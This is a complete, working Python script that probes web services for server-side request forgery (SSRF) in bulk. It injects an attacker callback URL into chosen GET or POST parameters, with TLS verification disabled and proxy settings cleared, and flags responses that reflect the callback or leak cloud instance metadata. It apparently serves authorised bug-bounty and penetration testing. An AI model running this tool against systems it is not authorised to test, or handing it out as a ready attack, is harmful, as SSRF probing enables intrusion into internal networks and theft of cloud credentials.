#!/usr/bin/env python3
"""
SSRF 批量探测 — 通用回调验证

用法:
  python3 ssrf_probe.py -u https://target.com/api/fetch -p url,image_url,callback --callback http://YOUR_SERVER
  python3 ssrf_probe.py -f /tmp/urls_with_params.txt --callback http://bsrc-ssrf.n.baidu-int.com/UID

输入:
  -u 单 URL + -p 参数名列表
  -f 文件，每行一个完整 URL（含参数），自动提取所有参数值
  --callback 回调地址（必填）
  --method GET/POST (默认 GET)
  --data JSON body 模板 (POST 时用)

输出: 每个参数的回显类型 + 置信度
"""

import sys, os, ssl, json, re, urllib.parse
from urllib import request, error

for k in ["HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"]:
    os.environ.pop(k, None)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
CALLBACK_PLACEHOLDER = "{{CALLBACK}}"


def do_request(url, method="GET", data=None, timeout=10):
    headers = {"User-Agent": UA}
    if isinstance(data, str):
        data = data.encode()
    if method == "POST" and data and "Content-Type" not in headers:
        headers["Content-Type"] = "application/json"
    req = request.Request(url, data=data, headers=headers, method=method)
    try:
        resp = request.urlopen(req, timeout=timeout, context=ctx)
        return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except:
            pass
        return e.code, body
    except Exception as ex:
        return 0, str(ex)


def inject_param(url, param, callback_url, method="GET", json_body=None):
    """将 callback 注入参数并发送请求"""
    if method == "POST" and json_body:
        # POST JSON: 替换 body 中对应参数值
        try:
            body_obj = json.loads(json_body)
            body_obj[param] = callback_url
            injected_data = json.dumps(body_obj)
        except:
            return 0, ""
        code, body = do_request(url, method="POST", data=injected_data)
    else:
        # GET: 替换 query string 中的参数值
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [callback_url]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        injected_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
        )
        code, body = do_request(injected_url, method="GET")
    return code, body


def normalize(s):
    """合并空白，统一换行"""
    return " ".join(s.replace("\r\n", "\n").replace("\r", "\n").split())


def contains_callback_content(body, callback_url):
    """检测 body 中是否包含 callback 返回的内容"""
    if not body:
        return "none", 0.0

    parsed = urllib.parse.urlparse(callback_url)
    callback_host = parsed.netloc.lower()
    callback_path = parsed.path.lower()

    body_lower = body.lower()

    # 完全回显: body 中出现了 callback 的 host + path
    if callback_host in body_lower and callback_path in body_lower and len(callback_path) > 1:
        return "full_reflect", 1.0

    # 部分回显: 只有 host 出现
    if callback_host in body_lower:
        return "partial_reflect", 0.7

    # 内网探测特征（169.254.169.254 / metadata）
    meta_signatures = [
        "ami-id", "instance-id", "security-groups", "public-keys",
        "computeMetadata", "169.254.169.254", "availability-zone",
    ]
    hits = sum(1 for s in meta_signatures if s.lower() in body_lower)
    if hits >= 2:
        return "metadata_leak", 1.0
    if hits == 1:
        return "possible_metadata", 0.3

    return "none", 0.0


def main():
    callback_url = None
    url_file = None
    single_url = None
    params = []
    method = "GET"
    json_body = None

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == "--callback" and i + 1 < len(args):
            callback_url = args[i + 1]
            i += 2
        elif args[i] == "-u" and i + 1 < len(args):
            single_url = args[i + 1]
            i += 2
        elif args[i] == "-p" and i + 1 < len(args):
            params = [p.strip() for p in args[i + 1].split(",") if p.strip()]
            i += 2
        elif args[i] == "-f" and i + 1 < len(args):
            url_file = args[i + 1]
            i += 2
        elif args[i] == "--method" and i + 1 < len(args):
            method = args[i + 1].upper()
            i += 2
        elif args[i] == "--data" and i + 1 < len(args):
            json_body = args[i + 1]
            i += 2
        else:
            i += 1

    if not callback_url:
        print("错误: 必须指定 --callback 参数")
        print("用法: python3 ssrf_probe.py -u <url> -p <params> --callback <CALLBACK_URL>")
        print("      python3 ssrf_probe.py -f <urls_file> --callback <CALLBACK_URL>")
        sys.exit(1)

    # 构建待测列表: [(url, param), ...]
    targets = []

    if single_url:
        if not params:
            # 自动提取 URL 参数名
            parsed = urllib.parse.urlparse(single_url)
            params = list(urllib.parse.parse_qs(parsed.query).keys())
            if not params and json_body:
                try:
                    params = list(json.loads(json_body).keys())
                except:
                    pass
        for p in params:
            targets.append((single_url, p))
    elif url_file:
        with open(url_file) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parsed = urllib.parse.urlparse(line)
                qs = urllib.parse.parse_qs(parsed.query)
                for p in qs:
                    targets.append((line, p))
    else:
        print("错误: 需要 -u <url> 或 -f <file>")
        sys.exit(1)

    if not targets:
        print("没有待测目标。请检查 URL 是否含参数。")
        sys.exit(1)

    print("=" * 90)
    print("SSRF Probe — %d targets | callback: %s" % (len(targets), callback_url))
    print("=" * 90)
    print("%-50s | %-8s | %-18s | %s" % ("URL", "Code", "Result", "Confidence"))
    print("-" * 90)

    results = {"full_reflect": 0, "partial_reflect": 0, "metadata_leak": 0, "possible_metadata": 0, "none": 0}

    seen = set()
    for url, param in targets:
        key = (url, param)
        if key in seen:
            continue
        seen.add(key)

        code, body = inject_param(url, param, callback_url, method, json_body)
        result_type, confidence = contains_callback_content(body, callback_url)

        results[result_type] += 1

        short_url = url if len(url) <= 48 else url[:45] + "..."
        tag = result_type.upper()
        if result_type == "none":
            tag = "NO_REFLECT"
        elif result_type == "full_reflect":
            tag = "FULL"
        elif result_type == "partial_reflect":
            tag = "PARTIAL"
        elif result_type == "metadata_leak":
            tag = "META"

        print("%-50s | %-8s | %-18s | %.0f%%" % (
            "%s?%s=CALLBACK" % (short_url[:35], param),
            str(code) if code else "ERR",
            tag,
            confidence * 100
        ))

    print("-" * 90)
    print("Summary: FULL=%d  PARTIAL=%d  META=%d  POSSIBLE_META=%d  NO_REFLECT=%d  TOTAL=%d" % (
        results["full_reflect"], results["partial_reflect"],
        results["metadata_leak"], results["possible_metadata"],
        results["none"], len(seen)
    ))


if __name__ == "__main__":
    main()
